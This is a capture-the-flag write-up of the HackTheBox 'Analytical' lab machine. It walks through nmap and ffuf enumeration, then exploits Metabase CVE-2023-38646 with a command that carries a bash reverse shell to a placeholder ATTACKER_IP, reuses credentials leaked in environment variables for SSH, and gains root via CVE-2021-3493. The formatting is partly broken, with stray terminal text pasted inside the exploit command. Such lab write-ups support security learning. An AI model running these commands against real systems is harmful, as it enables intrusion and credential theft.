Start with Nmap scan

Command

```
/opt/mycustomscript/autonmapscan.sh

Enter the target IP address: 10.10.11.233

 Visiting the webpage, it redirects us to `http://analytical.htb/`. 

 We then need to add the `http://analytical.htb/` to our `/etc/hosts`

```
10.10.11.233 analytical.htb
```

Then by visiting `http://analytical.htb/` we should be able to see the page now.

There is not much that we can navigate on the page. 

There are name of people that might be a username

```
Jonnhy Smith
Alex Kirigo
Daniel Walker
due@analytical.com
```

We can keep this in our back pocket for now.

We will now fuzz the page.

We will use the tool `ffuf` 

Command:

`ffuf -u http://analytical.htb/FUZZ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt`

Result:

```

js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 44ms]
```

Seems pretty standard, we will lso do a subdomain fuzz and see if there is something useful.

Command:

`ffuf -H "Host: FUZZ.analytical.htb" -u http://analytical.htb/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 154`

Result:

```
data                    [Status: 200, Size: 77858, Words: 3574, Lines: 28, Duration: 132ms]
```

We can see that there is a `http://data.analytical.htb/`, we will then add this to our host file.

We can now acess the page and gave us a login for Metabase

![image](https://github.com/L43371/Write-up/assets/129752764/b839bf28-daee-4d74-9df7-643bcb4aa484)

We can see that there is a recent vulnerability on Metabase **CVE 2023-38646**

`python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681fâ”‚OLDPWD=/usr
 -c "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"

 We should be able to get a shell.

 Now we will run the command `env` , this will print the list of environment variables.

```

The user `metalytics` credential was exposed, we will try to ssh using this credential.

and it works. We will now use the exploit CVE-2021-3493.

We will download the `exploit.c` file to our machine and compile it then transfer it to the victim's machine and when running it. We should receive a root shell.

Success!
